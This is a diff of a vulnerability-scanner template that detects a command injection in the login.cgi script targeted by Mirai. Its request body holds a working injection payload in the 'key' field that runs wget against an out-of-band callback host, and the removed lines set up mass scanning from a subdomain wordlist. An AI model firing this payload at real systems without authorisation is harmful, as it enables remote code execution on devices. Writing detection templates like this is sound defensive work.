@@ -1,31 +1,32 @@
 id: mirai-unknown-rce
 
 info:
-  name: Mirai Unknown - Remote Code Execution
+  name: Mirai - Remote Command Injection
   author: gy741
   severity: critical
-  description: The unknown exploit targets the login CGI script, where a key parameter is not properly sanitized leading to a command injection.
-  reference: |
+  description: |
+    Mirai is susceptible to an unknown exploit that targets the login CGI script, where a key parameter is not properly sanitized leading to a command injection vulnerability.
+  reference:
     - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
-  tags: mirai,rce,oob
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: mirai,rce,oast
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  - raw:
+      - |
+        POST /cgi-bin/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
-    attack: sniper
-    threads: 100
-    raw:
-    - |+
-      POST /cgi-bin/login.cgi HTTP/1.1
-      Host: {{Subdomains}}
-      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
-      Connection: close
-      Accept: */*
-      Accept-Language: en
-      Connection: keep-alive
-      Content-Type: application/x-www-form-urlencoded
-      Content-Length: {{len("key=\';`wget http://{{Host}}.{{Port}}.{{Subdomains}}.mirai.{{MY-DOMAIN}}`;\#")}}
+        key=';`wget http://{{interactsh-url}}`;#
 
-      key=';`wget http://{{Host}}.{{Port}}.{{Subdomains}}.mirai.{{MY-DOMAIN}}`;#
-    unsafe: true
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+# Enhanced by mp on 2022/05/30
